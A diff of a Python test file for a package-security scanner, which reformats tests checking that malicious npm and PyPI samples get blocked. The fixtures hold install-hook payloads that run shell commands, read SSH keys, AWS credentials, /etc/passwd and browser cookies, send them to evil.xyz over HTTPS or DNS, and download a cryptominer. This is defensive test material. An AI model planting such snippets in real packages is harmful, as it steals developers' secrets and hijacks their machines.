@@ -44,8 +44,22 @@ async def _blocked(reg, files, scripts=None, age=24, name="test-pkg"):
         p.write_bytes(content) if isinstance(content, bytes) else p.write_text(content)
         arts.append(p)
     scanner_map = {
-        "npm": [IOCScanner(), CooldownScanner(s), MetadataScanner(), StaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
-        "pypi": [IOCScanner(), CooldownScanner(s), MetadataScanner(), PyPIStaticAnalysisScanner(s), HeuristicsScanner(), ASTScanner()],
+        "npm": [
+            IOCScanner(),
+            CooldownScanner(s),
+            MetadataScanner(),
+            StaticAnalysisScanner(s),
+            HeuristicsScanner(),
+            ASTScanner(),
+        ],
+        "pypi": [
+            IOCScanner(),
+            CooldownScanner(s),
+            MetadataScanner(),
+            PyPIStaticAnalysisScanner(s),
+            HeuristicsScanner(),
+            ASTScanner(),
+        ],
     }
     pkg = PackageInfo(
         name=name,
@@ -70,7 +84,9 @@ async def test_osp_cmd_01_exec_shell_npm():
     """OSPTrack cmd: child_process.exec() with shell command + exfil."""
     assert await _blocked(
         "npm",
-        {"s.js": "const{exec}=require('child_process');exec('whoami',(e,o)=>{require('https').get('https://evil.xyz/?d='+o)});"},
+        {
+            "s.js": "const{exec}=require('child_process');exec('whoami',(e,o)=>{require('https').get('https://evil.xyz/?d='+o)});"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -150,7 +166,9 @@ async def test_osp_dns_01_hex_subdomain():
     """OSPTrack DNS: hex-encoded data as DNS subdomain."""
     assert await _blocked(
         "npm",
-        {"s.js": "const dns=require('dns');dns.resolve(Buffer.from(JSON.stringify(process.env)).toString('hex').slice(0,60)+'.evil.xyz','A',()=>{});"},
+        {
+            "s.js": "const dns=require('dns');dns.resolve(Buffer.from(JSON.stringify(process.env)).toString('hex').slice(0,60)+'.evil.xyz','A',()=>{});"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -173,7 +191,9 @@ async def test_osp_fs_01_ssh_keys():
     """OSPTrack fs: SSH key file reading."""
     assert await _blocked(
         "npm",
-        {"s.js": "const fs=require('fs');const k=fs.readFileSync(require('os').homedir()+'/.ssh/id_rsa','utf8');fetch('https://evil.xyz/?k='+k);"},
+        {
+            "s.js": "const fs=require('fs');const k=fs.readFileSync(require('os').homedir()+'/.ssh/id_rsa','utf8');fetch('https://evil.xyz/?k='+k);"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -182,7 +202,9 @@ async def test_osp_fs_02_aws_creds():
     """OSPTrack fs: AWS credential file access."""
     assert await _blocked(
         "pypi",
-        {"setup.py": "import os;data=open(os.path.expanduser('~/.aws/credentials')).read();import urllib.request;urllib.request.urlopen('https://evil.xyz/?d='+data)"},
+        {
+            "setup.py": "import os;data=open(os.path.expanduser('~/.aws/credentials')).read();import urllib.request;urllib.request.urlopen('https://evil.xyz/?d='+data)"
+        },
     )
 
 
@@ -190,7 +212,9 @@ async def test_osp_fs_03_etc_passwd():
     """OSPTrack fs: /etc/passwd reading."""
     assert await _blocked(
         "pypi",
-        {"setup.py": "data=open('/etc/passwd').read();import urllib.request;urllib.request.urlopen('https://evil.xyz/?d='+data)"},
+        {
+            "setup.py": "data=open('/etc/passwd').read();import urllib.request;urllib.request.urlopen('https://evil.xyz/?d='+data)"
+        },
     )
 
 
@@ -198,7 +222,9 @@ async def test_osp_fs_04_browser_data():
     """OSPTrack fs: browser data theft (cookies, passwords)."""
     assert await _blocked(
         "npm",
-        {"s.js": "const fs=require('fs');const data=fs.readFileSync(require('os').homedir()+'/.config/google-chrome/Default/Cookies');fetch('https://evil.xyz/?d='+data.toString('base64'));"},
+        {
+            "s.js": "const fs=require('fs');const data=fs.readFileSync(require('os').homedir()+'/.config/google-chrome/Default/Cookies');fetch('https://evil.xyz/?d='+data.toString('base64'));"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -221,7 +247,7 @@ async def test_osp_obf_02_charcode():
     """OSPTrack obf: String.fromCharCode construction."""
     assert await _blocked(
         "npm",
-        {"s.js": "eval(String.fromCharCode(114,101,113,117,105,114,101)+'(\"child_process\").exec(\"id\")');"},
+        {"s.js": 'eval(String.fromCharCode(114,101,113,117,105,114,101)+\'("child_process").exec("id")\');'},
         {"postinstall": "node s.js"},
     )
 
@@ -269,7 +295,9 @@ async def test_osp_crypto_01_xmrig():
     """OSPTrack crypto: XMRig miner deployment."""
     assert await _blocked(
         "npm",
-        {"s.js": "require('child_process').exec('curl https://evil.xyz/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig --url stratum+tcp://pool.minexmr.com:4444');"},
+        {
+            "s.js": "require('child_process').exec('curl https://evil.xyz/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig --url stratum+tcp://pool.minexmr.com:4444');"
+        },
         {"postinstall": "node s.js"},
     )
 
@@ -323,17 +351,17 @@ async def test_osptrack_benchmark_summary():
             _RESULTS[name] = "FAIL"
 
     rate = passed / total * 100
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print(f"OSPTrack benchmark: {passed}/{total} ({rate:.0f}%)")
-    print(f"  Commands:    {sum(1 for k,v in _RESULTS.items() if k.startswith('cmd') and v=='PASS')}/4")
-    print(f"  Network:     {sum(1 for k,v in _RESULTS.items() if k.startswith('net') and v=='PASS')}/4")
-    print(f"  DNS:         {sum(1 for k,v in _RESULTS.items() if k.startswith('dns') and v=='PASS')}/2")
-    print(f"  File system: {sum(1 for k,v in _RESULTS.items() if k.startswith('fs') and v=='PASS')}/4")
-    print(f"  Obfuscation: {sum(1 for k,v in _RESULTS.items() if k.startswith('obf') and v=='PASS')}/3")
-    print(f"  Persistence: {sum(1 for k,v in _RESULTS.items() if k.startswith('persist') and v=='PASS')}/2")
-    print(f"  Cryptomining:{sum(1 for k,v in _RESULTS.items() if k.startswith('crypto') and v=='PASS')}/1")
+    print(f"  Commands:    {sum(1 for k, v in _RESULTS.items() if k.startswith('cmd') and v == 'PASS')}/4")
+    print(f"  Network:     {sum(1 for k, v in _RESULTS.items() if k.startswith('net') and v == 'PASS')}/4")
+    print(f"  DNS:         {sum(1 for k, v in _RESULTS.items() if k.startswith('dns') and v == 'PASS')}/2")
+    print(f"  File system: {sum(1 for k, v in _RESULTS.items() if k.startswith('fs') and v == 'PASS')}/4")
+    print(f"  Obfuscation: {sum(1 for k, v in _RESULTS.items() if k.startswith('obf') and v == 'PASS')}/3")
+    print(f"  Persistence: {sum(1 for k, v in _RESULTS.items() if k.startswith('persist') and v == 'PASS')}/2")
+    print(f"  Cryptomining:{sum(1 for k, v in _RESULTS.items() if k.startswith('crypto') and v == 'PASS')}/1")
     for name, status in _RESULTS.items():
         if status == "FAIL":
             print(f"  [FAIL] {name}")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     assert rate >= 90, f"OSPTrack detection rate {rate:.0f}% below 90% target"
